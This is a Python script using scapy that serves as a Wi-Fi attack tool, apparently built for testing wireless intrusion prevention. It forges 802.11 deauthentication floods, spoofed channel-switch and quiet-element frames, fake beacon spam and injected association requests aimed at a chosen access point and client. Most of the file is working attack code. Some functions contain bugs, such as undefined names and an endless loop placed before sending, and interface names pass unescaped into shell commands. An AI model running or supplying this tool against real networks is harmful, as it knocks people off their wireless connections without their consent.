#!/usr/bin/python3

from __future__ import print_function
import argparse, subprocess, os, time, string, random, sys, struct, datetime
from multiprocessing import Process
from prettytable import PrettyTable
from termcolor import colored
from threading import Thread
from scapy.all import ( Dot11,
                        Dot11Beacon,
                        Dot11Elt,
                        Dot11AssoReq,
                        RadioTap,
                        sendp,
                        hexdump,
                        sniff,
                        RandMAC,
                        Dot11Deauth)

ap_list = []        #global list that holds all found access points, including the channel they are on.
monitorMode = False #global variable to indicute whether monitormode was already enabled (to prevent error msges).
def main():
    parser = argparse.ArgumentParser(description='Python script that is capable of transmitting and receiving 802.11 packets')
    parser.add_argument('-i', '--iface', nargs='?', type=str, help="Specify which WLAN adapter has to be used.", required=True)
    parser.add_argument('-b', '--bssid', nargs='?', type=str, help="Specify BSSID of the AP you want to target", required=True)
    parser.add_argument('-m', '--mac', nargs='?', type=str, help="Specify the MAC address of the client you want to target", required=True)
    parser.add_argument('-t', '--time', nargs='?', type=int, help="Specify time in seconds the attack has to run(negative number for infinite time).", required=True)
    parser.add_argument('-r', '--interval', nargs='?', type=float, help="Specify rate in seconds that deauth frames should be transmitted.", default=0.100)
    parser.set_defaults(mode='none')
    subparsers = parser.add_subparsers()

    ssidSpawn = subparsers.add_parser('ssidSpawner', help='Spawn random SSIDs')
    ssidSpawn.set_defaults(mode='ssidSpawner')

    discoverAP = subparsers.add_parser('discoverAPs', help='Scan for nearby APs and prints them in a list.')
    discoverAP.add_argument('-s', '--ssid', nargs='?', type=str, help="Specify from which SSID you want to discover APs", required=False)
    discoverAP.set_defaults(mode='discoverAPs')

    ## attacks ##
    deauth = subparsers.add_parser('deauth', help='Perform a deauth attack.')
    deauth.add_argument('-a', '--amount', nargs='?', type=int, help="Specify the amount of deauth frames you want to send", required=False)
    deauth.add_argument('-c', '--channel', nargs='?', type=int, help="Specify which channel has to be used for transmitting.", required=True)
    deauth.set_defaults(mode='deauth')

    channelSwitch = subparsers.add_parser('channelswitch', help='Make a target switch to another channel.')
    channelSwitch.add_argument('-s', '--ssid', nargs='?', type=str, help="Specify SSID of you want to target", required=True)
    channelSwitch.add_argument('-c', '--channel', nargs='?', type=int, help="Specify which channel has to be used for transmitting.", required=True)
    channelSwitch.set_defaults(mode='channelswitch')


    quiet = subparsers.add_parser('quiet', help='Make a target quiet for a specific amount of time.')
    quiet.add_argument('-s', '--ssid', nargs='?', type=str, help="Specify SSID of you want to target", required=True)
    quiet.add_argument('-c', '--channel', nargs='?', type=int, help="Specify which channel has to be used for transmitting.", required=True)
    quiet.set_defaults(mode='quiet')

    quietAction = subparsers.add_parser('quietaction', help='Make a target quiet for a specific amount of time.')
    quietAction.add_argument('-s', '--ssid', nargs='?', type=str, help="Specify SSID of you want to target", required=True)
    quietAction.add_argument('-c', '--channel', nargs='?', type=int, help="Specify which channel has to be used for transmitting.", required=True)
    quietAction.set_defaults(mode='quietAction')

    assocReqAttack = subparsers.add_parser('associationRequestAttack', help='Make a target switch to another channel.')
    assocReqAttack.add_argument('-a', '--amount', nargs='?', type=int, help="Specify the amount of channel switch frames you want to send", default=10)
    assocReqAttack.add_argument('-c', '--channel', nargs='?', type=int, help="Specify which channel has to be used for transmitting.", required=True)
    assocReqAttack.set_defaults(mode='associationRequestAttack')

    args = parser.parse_args()

    # Print overview of specified options. 
    x = PrettyTable()
    x.field_names = [colored('Key', 'green', attrs=['bold']), colored('Value', 'green', attrs=['bold'])]
    x.align = 'l'
    if(args.mode == 'discoverAPs'):
        config = {
            'iface': args.iface,
            'ssid': args.ssid
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)      
        discoverAPs(config)
    elif(args.mode == 'ssidSpawner'):
        config = {
            'iface': args.iface,
            'channel': args.channel
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)      
        ssidSpawner(config)
    elif(args.mode == 'deauth'):
        config = {
            'iface': args.iface,
            'channel': args.channel,
            'bssid': args.bssid,
            'mac': args.mac,
            'amount': args.amount,
            'time': args.time,
            'interval': args.interval
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)      
        deauthAttack(config)
    elif(args.mode == 'channelswitch'):
        config = {
            'iface': args.iface,
            'ssid': args.ssid,
            'channel': args.channel,
            'bssid': args.bssid,
            'mac': args.mac,
            'time': args.time,
            'interval': args.interval
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)
        channelSwitchAttack(config)
    elif(args.mode == 'quiet'):
        config = {
            'iface': args.iface,
            'ssid': args.ssid,
            'channel': args.channel,
            'bssid': args.bssid,
            'mac': args.mac,
            'time': args.time,
            'interval': args.interval
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)
        quietAttack(config)
    elif(args.mode == 'quietAction'):
        config = {
            'iface': args.iface,
            'ssid': args.ssid,
            'channel': args.channel,
            'bssid': args.bssid,
            'mac': args.mac,
            'time': args.time,
            'interval': args.interval
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)
        quietActionAttack(config)
    elif(args.mode == 'associationRequestAttack'):
        config = {
            'iface': args.iface,
            'channel': args.channel,
            'bssid': args.bssid,
            'mac': args.mac,
            'amount': args.amount
        }
        for key, value in config.items():
            x.add_row([key, value])
        print(x)
        associationRequestAttack(config)
    else:
        parser.print_help()


#WiP
def ssidSpawner(config):
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    setChannel(str(config["iface"]), config["channel"])

    frames = []
    while True:
    #for netSSID in ssids:
        netSSID = id_generator()    
        print(netSSID)
        dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=str(RandMAC()), addr3=str(RandMAC()))
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
        rsn = Dot11Elt(ID='RSNinfo', info=(
          '\x01'                     #RSN Version 1
          '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
          '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
          '\x00\x0f\xac\x04'         #AES Cipher
          '\x00\x0f\xac\x02'         #TKIP Cipher
          '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
          '\x00\x0f\xac\x02'         #Pre-Shared Key
          '\x00\x00'))               #RSN Capabilities (no extra capabilities)

        frame = RadioTap()/dot11/beacon/essid/rsn
        print("SSID=%-20s   %r"%(netSSID,frame))
        frames.append(frame)
    sendp(frames, iface=iface, inter=0.0100 if len(frames)<10 else 0, loop=1)        


"""
address 1 = Destination MAC address.
address 2 = Source MAC address.
address 3 = MAC address of AP. 
"""
def quietAttack(config):
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    setChannel(str(config["iface"]), config["channel"])
    timeToRun = (time.time() + config["time"])

    dot11 = Dot11(type=0, subtype=8, addr1=config["mac"], addr2=config["bssid"], addr3=config["bssid"])
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=config["ssid"], len=len(config["ssid"]))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01'                     #RSN Version 1
        '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'         #AES Cipher
        '\x00\x0f\xac\x02'         #TKIP Cipher
        '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'         #Pre-Shared Key
        '\x01\x00'))               #RSN Capabilities (no extra capabilities)

    quiet = Dot11Elt(ID='Quiet', info=(
    '\x00'          #Quiet count     | remaining beacon intervals before quiet interval starts (0 for direct)
    '\x00'          #Quiet period    | #0 indicates no quiet periods are scheduled. A non-zero value indicates the number of beacon intervals between each period.
    '\x00\x10'      #Quiet duration  | length of quiet period in time units (TU).
    '\x00\x00'))    #Quiet offset    | possiblity to specify other start time than right after beacon in TU, But has to be shorther than beacon interval. 
    frame = RadioTap()/dot11/beacon/essid/quiet

    printTime()
    while(time.time() < timeToRun):
        sendp(frame, iface=config["iface"], loop=0, verbose=0)
        time.sleep(config["interval"])  
    printTime()


"""
address 1 = Destination MAC address.
address 2 = Source MAC address.
address 3 = MAC address of AP. 
"""
def deauthAttack(config):
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    setChannel(str(config["iface"]), config["channel"])   
    timeToRun = (time.time() + config["time"])

    packetToClient = RadioTap()/Dot11(type=0,subtype=12,addr1=config["mac"],addr2=config["bssid"],addr3=config["bssid"])/Dot11Deauth(reason=7)
    packetToAP = RadioTap()/Dot11(type=0,subtype=12,addr1=config["bssid"],addr2=config["mac"],addr3=config["mac"])/Dot11Deauth(reason=7)
    print("DA:" + str(config["mac"]) + " SA: " + str(config["bssid"]) + " BSSID: " + str(config["bssid"]))
    printTime()
    b = 1
    while(time.time() < timeToRun):
        if (config["amount"]):
            for i in range(int(config["amount"])):
                sendp(packetToAP, iface=config["iface"], loop=0, verbose=0)
                sendp(packetToClient, iface=config["iface"], loop=0, verbose=0)
                sleep(config["interval"])
        else:
            print(str(b) + " frame(s) send.. ")
            printTime()
            sendp(packetToAP, iface=config["iface"], loop=0, verbose=0)
            sendp(packetToClient, iface=config["iface"], loop=0, verbose=0)
            time.sleep(config["interval"])
            b+=1
    printTime()


"""
address 1 = Destination MAC address.
address 2 = Source MAC address.
address 3 = MAC address of AP. 
"""
# 60:"Extended Channel Switch Announcement"
def channelSwitchAttack(config):
    frame = ""
    frameType = "beacon"  #choose betweeen action_frame or beacon.
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    setChannel(str(config["iface"]), config["channel"])  
    timeToRun = (time.time() + config["time"])

    print("Sending channelSwitchBeacon to " + str(config["mac"]) + " from: " + config["bssid"] + " on channel: " + str(config["channel"]))
    if(frameType == "action_frame"):
        dot11 = Dot11(type=0, subtype=13, addr1=config["mac"], addr2=config["bssid"], addr3=config["bssid"])
        category = ('\x00' # spectrum management
                    '\x04')    #channel switch announcement
        csa = Dot11Elt(ID='Channel Switch', info=(
        '\x00'  #Channel switch mode
        '\x04'  #new channel ))
        '\x00')) #channel switch cnt    
        frame = RadioTap()/dot11/category/csa
    elif(frameType == "beacon"): 
        dot11 = Dot11(type=0, subtype=8, addr1=config["mac"], addr2=config["bssid"], addr3=config["bssid"])
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID',info=config["ssid"], len=len(config["ssid"]))
        csa = Dot11Elt(ID='Channel Switch', info=(
        '\x00'      #Channel switch mode
        '\x64'      #new channel ))
        '\x00'))    #channel switch cnt    
        frame = RadioTap()/dot11/beacon/essid/csa

    printTime()
    while(time.time() < timeToRun):  
        #frame.show()
        sendp(frame, iface=config["iface"], loop=0, verbose=0)
        time.sleep(config["interval"])
    printTime()


def discoverAPs(config):
    mhzToChannel = {2412:1, 2417:2, 2422:3, 2427:4, 2432:5, 2437:6, 2442:7, 2447:8, 2452:9,
                    2457:10, 2462:11, 2467:12, 2472:13, 5180:36, 5200:40, 5220:44, 5230:46,
                    5240:48, 5260:52, 5270:54, 5280:56, 5300:60, 5310:62, 5320:64, 5500:100, 
                    5510:102, 5520:104, 5540:108, 5550:110, 5560:112, 5580:116, 5600:120, 
                    5620:124, 5640:128}
    availableChannels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 38, 40, 44, 46, 48, 52,
                         54, 56, 60, 62, 64, 100, 102, 104, 108, 110, 112, 116]
    discoveredAPList = []
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    #TODO list door dictionary vervangen.
    def packetHandler(packet):
        if((packet.haslayer(Dot11Beacon))):
            try:
                ssid       = packet[Dot11Elt].info
                bssid      = packet[Dot11].addr3
                channel    = mhzToChannel.get(packet[RadioTap].Channel)
            except Exception as e: 
                print(e)
                return
            # Save discovered AP, including the channel.
            if(len(discoveredAPList) >= 0):
                duplicateEntry = False
                i = 0
                while(i < len(discoveredAPList)):
                    if(discoveredAPList[i] == bssid and discoveredAPList[i+1] == channel and discoveredAPList[i+2] == ssid):
                        duplicateEntry = True
                        break
                    i += 3
                if not duplicateEntry:
                    if(config["ssid"] is not None):
                        if(config["ssid"] in str(ssid)):
                            discoveredAPList.append(bssid)
                            discoveredAPList.append(channel)
                            discoveredAPList.append(ssid)
                    else:
                        discoveredAPList.append(bssid)
                        discoveredAPList.append(channel)
                        discoveredAPList.append(ssid)
            else:
                discoveredAPList.append(bssid)
                discoveredAPList.append(channel) 
                discoveredAPList.append(ssid) 

    for channel in availableChannels:
        if(monitorMode):        
            try:
                ts = time.time()
                st = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S:%f')[:-3]
                print(st + " Channel was set to " + str(channel))
                os.system("iw dev %s set channel %d" % (config["iface"], channel))
                sniff(iface=config["iface"], prn=packetHandler, timeout=0.5)
                #print("sniffing has ended.")
            except KeyboardInterrupt:
                break
        else:
            sys.exit("Please enable monitor mode first..")

    x = PrettyTable()
    x.field_names = [colored('AP_MAC', 'green', attrs=['bold']), colored('Channel', 'green', attrs=['bold']), colored('SSID', 'green', attrs=['bold'])]
    x.align = 'l'
    i = 0
    while(i < len(discoveredAPList)):
        x.add_row([str(discoveredAPList[i]), str(discoveredAPList[i+1]), str(discoveredAPList[i+2])])
        i += 3   
    print(x)
    return discoveredAPList


"""
address 1 = Destination MAC address.
address 2 = Source MAC address.
address 3 = MAC address of AP. 
** list structure **
aps = [ssid, channel, ssid]
"""
# 60:"Extended Channel Switch Announcement"
def channelSwitchAttackActionFrame(config):
    #methods that discover all the access points that are nearby.
    aps = discoverAPs(config)
    # Attack the target.
    timeToRun = (time.time() + config["time"])
    printTime()
    while(time.time() < timeToRun):
        i = 0
        while(i < len(aps)):
            print("Sending channelSwitchBeacon to " + str(config["mac"]) + " from: " + str(aps[i]) + " on channel: " + str(aps[i+1]))
            setChannel(config["iface"], aps[i+1])
            dot11 = Dot11(type=0, subtype=13, addr1=config["mac"], addr2=aps[i], addr3=aps[i])
            category = ('\x00' # spectrum management
                        '\x04')    #channel switch announcement
            csa = Dot11Elt(ID='Channel Switch', info=(
            '\x00'  #Channel switch mode
            '\x7c'  #new channel ))
            '\x00')) #channel switch cnt    
            frame = RadioTap()/dot11/category/csa  
            frame.show()
            sendp(frame, iface=config["iface"], loop=0)
            time.sleep(config["interval"])
            i += 3
    printTime()



"""
address 1 = Destination MAC address.
address 2 = Source MAC address.
address 3 = MAC address of AP. 
"""
def quietActionAttack(config):
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    setChannel(str(config["iface"]), config["channel"])
    timeToRun = (time.time() + config["time"])

    dot11 = Dot11(type=0, subtype=13, addr1=config["mac"], addr2=config["bssid"], addr3=config["bssid"])
    category = ('\x04' # public action 
                '\x04')    #channel switch announcement
    csa = Dot11Elt(ID='Extended Channel Switch Announcement', info=(
        '\x00'  #Channel switch mode
        '\x0B'  #new channel ))
        '\x00')) #channel switch cnt        
    quiet = Dot11Elt(ID='Quiet', info=(
        '\x00'      #Quiet count     | remaining beacon intervals before quiet interval starts (0 for direct)
        '\x00'      #Quiet period    | #of beacon intervals to wait in between
        '\x00\x40'      #Quiet duration  | length of quiet period in time units (TU)
        '\x00\x00'))    #Quiet offset    | possiblity to specify another offset after start time. Unclear?
    frame = RadioTap()/dot11/category/csa
    printTime()
    while(time.time() < timeToRun):
        sendp(frame, iface=config["iface"], loop=0, verbose=0)
        time.sleep(config["interval"])  
    printTime()



"""
address 1 = Destination MAC address (Target MAC).
address 2 = Source MAC address (AP MAC).
address 3 = MAC address of AP(BSSID). 
"""
def associationRequestAttack(config):
    #enable monitor mode and set the channel.
    setMonitorMode(config["iface"])
    setChannel(str(config["iface"]), config["channel"])

    def sendAssocReq():
        #packet to client
        dot11 = Dot11(type=0, subtype=0, addr1=config["bssid"], addr2=config["mac"], addr3=config["mac"])
        auth = Dot11AssoReq(ID=ESS, info='\x01')#ESS=0x0, privacy=0x1)  
        essid = Dot11Elt(ID='SSID',info="wips-test-psk", len=len("wips-test-psk"))
        #rsn omzetten naar Dot11EltRSN
        rsn = Dot11Elt(ID='RSNinfo', info=(
          '\x01'                     #RSN Version 1
          '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
          '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
          '\x00\x0f\xac\x04'         #AES Cipher
          '\x00\x0f\xac\x02'         #TKIP Cipher
          '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
          '\x00\x0f\xac\x02'         #Pre-Shared Key
          '\x00\x00'))               #RSN Capabilities (no extra capabilities)
        frame = RadioTap()/dot11/auth/essid#/rsn  
        frame.show()
        sendp(frame, iface=config["iface"], inter=0.100, loop=0) 


    def filter(packet):
        if packet.subtype != 11:
            return False
        else:
            return True


    #miss stop filter naar packethandler (prn) veranderen
    def stopfilter(packet):
        if packet.haslayer(Dot11):
            #print("802.11 packet found..")
            if packet.type == 0 and packet.subtype == 11:           #c4:13
                print("AuthenticationRequestFound with DMAC: " + str(packet.addr1) + " and SMAC: " + str(packet.addr2))
                # only target specific client...
                print("bssid: " + config["bssid"] + " addr1: " + packet.addr1 + " addr2: " + packet.addr2 + " mac: " + config["mac"] + " addr3: " + packet.addr3)
                if(packet.addr1 == config["bssid"] and packet.addr2 == config["mac"] and packet.addr3 == config["bssid"]):
                    print("Send associationRequest...")
                    sendAssocReq()
                    return True
        else:
            return False   

    packet = sniff(iface=config["iface"], filter="type Management", stop_filter=stopfilter, store=0)
    #, """lfilter=filter"""
    print("stopped")


#Dot11AssoReq(Packet):             
"""capability_list = ["res8", "res9", "short-slot", "res11",
                   "res12", "DSSS-OFDM", "res14", "res15",
                   "ESS", "IBSS", "CFP", "CFP-req",
                   "privacy", "short-preamble", "PBCC", "agility"]
                   """

def setMonitorMode(iface):
    print("Shutting down interface " + iface)
    os.system("ifconfig " + iface + " down")
    print("Setting monitor mode")
    os.system("iw dev %s set type monitor" % (iface))
    print("Enabling interface " + iface)
    os.system("ifconfig " + iface + " up")
    global monitorMode
    monitorMode = True
    print("done")


#SetMonitorMode has to be called first...
def setChannel(iface, channel):
    if(monitorMode):
        os.system("iw dev %s set channel %d" %(iface, channel))
    else:
        sys.exit("Please enable monitor mode before trying to swap channels")

#Method that randomly hops between available channels. 
#This method must be called a subprocess.
def random_channel_hopper(iface):
    availableChannels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 38, 40, 44, 46, 48, 52,
                         54, 56, 60, 62, 64, 100, 102, 104, 108, 110, 112, 116, 120, 124, 128]
    if(monitorMode):
        while True:
            try:
                channel = random.choice(availableChannels)
                print("Jumping to channel:" + str(channel)) 
                os.system("iw dev %s set channel %d" % (iface, channel))
                time.sleep(1)
            except KeyboardInterrupt:
                break
    else:
        sys.exit("Please enable monitor mode before trying to swap channels")        

#Method that hops between available channels. 
#This method must be called a subprocess.
def channel_hopper(iface):
    availableChannels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 38, 40, 44, 46, 48, 52,
                         54, 56, 60, 62, 64, 100, 102, 104, 108, 110, 112, 116, 120, 124, 128]
    if(monitorMode):
        while True:
            try:
                for channel in availableChannels:
                    print("Jumping to channel:" + str(channel)) 
                    os.system("iw dev %s set channel %d" % (iface, channel))
                    time.sleep(0.5)
            except KeyboardInterrupt:
                break
    else:
        sys.exit("Please enable monitor mode before trying to swap channels")   

def id_generator(size=10, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size)) 


def printTime():
    ts = time.time()
    print(datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S:%f')[:-3])

if __name__ == '__main__': 
    main()
